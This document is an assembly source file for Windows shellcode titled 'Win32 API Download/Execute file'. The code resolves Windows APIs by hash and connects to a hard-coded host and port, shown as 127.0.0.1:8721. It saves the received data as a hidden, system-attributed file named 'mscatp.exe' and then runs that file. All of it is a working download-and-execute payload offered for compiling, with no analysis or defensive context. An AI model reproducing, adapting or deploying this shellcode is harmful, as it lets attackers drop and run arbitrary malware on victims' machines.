;      Title:  Win32 API Download/Execute file
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003


;To compile:
;nasmw -fbin -O6 shellcode.asm


FILE_ATTRIBUTE_HIDDEN	EQU	2
FILE_ATTRIBUTE_SYSTEM	EQU	4
CREATE_ALWAYS		EQU	2
FILE_SHARE_READ		EQU	1
GENERIC_WRITE		EQU	0x40000000

BUFF_SIZE		EQU	512


%xdefine		FILENAME	'mscatp.exe'


CPU 386
[BITS 32]


GLOBAL _entry
_entry:

	cld
	call Kernel32Base


; ARGS:		edx: API name hash
;		ebx: dll address
; Return:	eax: API address
; ERROR:	ecx == 0
LGetProcAddress:		; USES ebx ebp esi edi
	push ebp
	push esi
	push edi
	mov eax, [ebx + 0x3c]
	lea esi, [ebx + eax + 0x78]
	lodsd			; Export Table RVA
	push dword [esi]	; Export Table size
	add eax, ebx		; Export Table address
	push eax
	mov ecx, [eax + 0x18]	; NumberOfNames
	mov ebp, [eax + 0x20]
	add ebp, ebx		; AddressOfNames

.Nextf
	jecxz	.End1
	dec ecx
	mov esi, [ebp + ecx * 4]
	add esi, ebx
	xor edi, edi

.Lhash
	xor eax, eax
	lodsb
	cmp al, ah
	je .Fh
	ror edi, 13
	add edi, eax
	jmp short .Lhash

.Fh
	cmp edi, edx
	jnz .Nextf

	pop ebp				; Export Table
	mov edx, [ebp + 0x24]
	add edx, ebx			; AddressOfNameOrdinals
	mov cx, [edx + ecx * 2]
	mov edx, [ebp + 0x1C]
	add edx, ebx			; AddressOfFunctions
	mov eax, [edx + 4 * ecx]
	add eax, ebx

.FDone
	pop ecx		; Export Table size
	push eax
	sub eax, ebp
	cmp eax, ecx
	pop eax
	ja .End2

	xchg esi, eax		; Export Forwarding
	sub esp, byte 0x40
	mov edi, esp

.FCopy
	stosb
	lodsb
	cmp al, '.'
	jne .FCopy

	mov byte [edi], 0
	mov edi, esp
	inc edi

	mov ebp, [esp + 0x48]		; old EBP
	push edi
	call [ebp - __LOADLIBRARY]
	push esi
	push eax
	call [ebp - __GETPROCADDR]
	add esp, byte (0x40 - 8)
	mov cl, 1	;ecx != 0

.End1
	add esp, byte 8
.End2
	pop edi
	pop esi
	pop ebp
	ret


Kernel32Base:
	mov eax, [fs:0x30]
	test eax, eax
	js .find_kernel32_9x
.find_kernel32_nt
	mov eax, [eax + 0x0c]
	mov esi, [eax + 0x1c]
	lodsd
	mov ebx, [eax + 0x8]
	jmp short .kf
.find_kernel32_9x
	mov eax, [eax + 0x34]
	mov ebx, [eax + 0xB8]
.kf

	pop edi

    ; ebx = kernel32
    ; edi = LGetProcAddress

    mov ebp, esp
    push ebx				; __KERNEL32

    mov edx, 0xec0e4e8e			; LoadLibraryA
    call edi
    push eax				; __LOADLIBRARY

    mov edx, 0x7c0dfcaa			; GetProcAddress
    call edi
    push eax				; __GETPROCADDR
    push eax


	__KERNEL32	EQU	0x4	;[ebp - 4]
	__LOADLIBRARY	EQU	0x8	;[ebp - 8]
	__GETPROCADDR	EQU	0xC	;[ebp - 0xC]
	DL_FILENAME	EQU	0x10	;[ebp - 0xC]

	STACK_CNT	EQU	DL_FILENAME

	call .LoadK32

.KERNEL32
		CloseHandle			EQU	((1*4) + STACK_CNT)
	dd 0x0ffd97fb
		CreateFile			EQU	((2*4) + STACK_CNT)
	dd 0x7c0017a5
		WriteFile			EQU	((3*4) + STACK_CNT)
	dd 0xe80a791f
		ExitThread			EQU	((4*4) + STACK_CNT)
	dd 0x60e0ceef
		CreateProcess			EQU	((5*4) + STACK_CNT)
	dd 0x16b3fe72


	K32_APINUM	EQU	(($-.KERNEL32)/4)

.LoadK32
	pop esi
	push K32_APINUM
	pop ecx

.k32
	push ecx
	lodsd
	xchg edx, eax
	call edi
	pop ecx
	push eax		;save APIs on stack

	loop .k32


	call .LoadWsock32

	db 'WS2_32', 0,0

.WSOCK32

		WSAStartup		EQU	(((1*4) + STACK_CNT) + (K32_APINUM*4))
	dd	0x3bfcedcb   
		 socket			EQU	(((2*4) + STACK_CNT) + (K32_APINUM*4))
	dd	0x492f0b6e	
		 closesocket		EQU	(((3*4) + STACK_CNT) + (K32_APINUM*4))
	dd	0x79c679e7	
		 connect		EQU	(((4*4) + STACK_CNT) + (K32_APINUM*4))
	dd	0x60aaf9ec
		recv			EQU	(((5*4) + STACK_CNT) + (K32_APINUM*4))	
	dd	0xe71819b6

	WSOCK32_APINUM		EQU	(($-.WSOCK32)/4)

.LoadWsock32
	pop esi

	push esi
	call [ebp - __LOADLIBRARY]
	xchg ebx, eax

	push WSOCK32_APINUM
	pop ecx
	lodsd
	lodsd

.Wsock32
	push ecx
	lodsd
	xchg edx, eax
	call edi
	pop ecx
	push eax		;save APIs on stack

	loop .Wsock32

	sub esp, BUFF_SIZE
	push esp
	push 2
	call [ebp - WSAStartup]

	xor eax, eax
	push eax
	push eax
	push eax
	push 1
	push 2
	call [ebp - socket]
	xchg ebx, eax

	push 0x0100007f		;host: 127.0.0.1
	push 0x11220002		;port: 8721
	mov edx, esp

	push 0
	push FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM
	push CREATE_ALWAYS
	push 0
	push FILE_SHARE_READ
	push GENERIC_WRITE
	call .lpFileName
	DB	FILENAME,0

.lpFileName
	pop eax
	mov [ebp - DL_FILENAME], eax
	push eax

	push 0x10
	push edx
	push ebx
	call [ebp - connect]
	or eax, eax
	jnz .cs

	call [ebp - CreateFile]
	xchg esi, eax
	inc eax
	jz .cs

	mov edi, esp
.recvloop
	push 0
	push BUFF_SIZE
	push edi
	push ebx
	call [ebp - recv]
	or eax, eax
	jle .cf

	push 0
	push esp
	push eax
	push edi
	push esi
	call [ebp - WriteFile]
	jmp short .recvloop

.cf
	push esi
	call [ebp - CloseHandle]

.cs
	push ebx
	call [ebp - closesocket]

	push esp
	lea edi, [esp + 0x14]
	push edi
	xor eax, eax
	push 0x44
	pop ecx
	mov [edi], ecx
	inc edi
	rep stosb

	mov cl, 7
.push0
	push eax
	loop .push0
	push DWORD [ebp - DL_FILENAME]
	call [ebp - CreateProcess]

	call [ebp - CloseHandle]
	call [ebp - CloseHandle]

.exit
	push 0
	call [ebp - ExitThread]
